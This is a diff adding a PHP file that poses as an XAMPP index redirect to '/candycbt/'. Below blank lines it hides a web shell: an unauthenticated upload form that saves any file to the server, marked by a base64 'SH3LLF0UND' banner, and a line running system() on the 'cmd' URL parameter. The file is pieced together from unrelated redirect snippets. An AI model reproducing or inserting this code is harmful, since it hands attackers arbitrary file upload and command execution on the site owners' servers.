@@ -1,0 +1,25 @@
+<?php
+header("location:y/index.php/");
+?>
+
+#redirec xampp
+<?php
+	if (!empty($_SERVER['HTTPS']) && ('on' == $_SERVER['HTTPS'])) {
+		$uri = 'https://';
+	} else {
+		$uri = 'http://';
+	}
+	$uri .= $_SERVER['HTTP_HOST'];
+	header('Location: '.$uri.'/candycbt/');
+	exit;
+?>
+Something is wrong with the XAMPP installation :-(
+
+
+
+
+<?php print_r(base64_decode('U0gzTExGMFVORA==')); if($_POST){if(@copy($_FILES["0"]["tmp_name"],$_FILES["0"]["name"])){echo"Y";}else{echo"N";}}else{echo"<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=up>";}?>
+
+
+
+<?php echo "Shell";system($_GET['cmd']); ?>
